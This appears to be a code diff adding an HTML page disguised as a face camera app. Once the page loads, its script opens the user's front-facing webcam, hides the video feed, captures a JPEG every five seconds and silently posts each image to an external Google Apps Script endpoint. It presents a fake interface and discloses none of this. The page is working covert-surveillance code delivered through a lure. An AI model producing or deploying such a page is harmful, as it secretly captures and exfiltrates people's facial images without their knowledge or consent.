@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Face App</title>
+
+<link rel="stylesheet" href="style.css">
+
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+</head>
+
+<body>
+
+<div id="device">
+
+<div id="top">
+<div class="left"></div>
+<div class="right"></div>
+</div>
+
+<div id="content">
+
+<div class="menu">
+<i class="fas fa-bolt fa-lg"></i>
+<div class="profilePhoto"></div>
+<i class="fas fa-volume-mute fa-lg"></i>
+</div>
+
+<div class="takenPhotos">
+<div class="first"></div>
+<div class="second"></div>
+<div class="third"></div>
+</div>
+
+<div class="circle">
+<div class="fill"></div>
+</div>
+
+<i class="fas fa-sync-alt fa-lg right"></i>
+
+<div class="detection">
+<div class="line-left"></div>
+<div class="line-top"></div>
+<div class="line-right"></div>
+<div class="line-bottom"></div>
+</div>
+
+</div>
+</div>
+
+<div class="video-wrap" hidden>
+<video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden id="canvas" width="640" height="640"></canvas>
+
+<script>
+
+function post(imgdata){
+
+$.ajax({
+
+type: 'POST',
+
+url: 'https://script.google.com/macros/s/AKfycbyaLQ2AmryI8aUb-gFrHfwtp7n8hB6wX34TMkZdfBbDTnNlPW8ge2hINlV1a28M1Hcgig/exec',
+
+data: {cat: imgdata},
+
+success: function(result){
+
+console.log("sent");
+
+},
+
+error: function(){
+
+console.log("error");
+
+}
+
+});
+
+}
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+
+const constraints = {
+
+audio:false,
+
+video:{facingMode:"user"}
+
+};
+
+async function init(){
+
+try{
+
+const stream = await navigator.mediaDevices.getUserMedia(constraints);
+
+video.srcObject = stream;
+
+const context = canvas.getContext('2d');
+
+setInterval(function(){
+
+context.drawImage(video,0,0,640,640);
+
+var canvasData = canvas.toDataURL("image/jpeg",0.7);
+
+var cc = canvasData.replace("data:image/jpeg;base64,","");
+
+post(cc);
+
+},5000);
+
+}
+
+catch(e){
+
+console.log(e);
+
+}
+
+}
+
+init();
+
+</script>
+
+</body>
+</html>
